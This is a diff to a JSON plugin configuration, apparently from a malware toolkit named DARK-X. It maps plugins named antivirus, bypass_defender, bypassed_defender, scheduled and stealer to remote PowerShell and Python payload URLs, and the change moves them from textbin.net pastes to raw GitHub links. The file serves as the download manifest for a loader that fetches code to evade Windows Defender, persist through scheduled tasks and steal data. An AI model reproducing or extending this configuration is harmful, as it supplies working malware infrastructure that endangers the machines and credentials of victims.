@@ -1,22 +1,22 @@
 {
 	"antivirus": {
-		"Url" : "https://textbin.net/raw/q3ujywlwyj",
+		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/AntiVirus.ps1",
 		"Extention" : "PS1"
 	},
 	"bypass_defender": {
-		"Url" : "https://textbin.net/raw/dttslrsn9w",
+		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/BypassDefender.ps1",
 		"Extention" : "PS1"
 	},
 	"bypassed_defender": {
-		"Url" : "https://textbin.net/raw/aqqqqwiun9",
+		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/BypassedDefender.ps1",
 		"Extention" : "PS1"
 	},
 	"scheduled": {
-		"Url" : "https://textbin.net/raw/1f9gzhorp0",
+		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/Scheduled.ps1",
 		"Extention" : "PS1"
 	},
 	"stealer": {
-		"Url" : "https://textbin.net/raw/0wahh3a3hc",
+		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/Stealer.py",
 		"Extention" : "Py"
 	}
 }
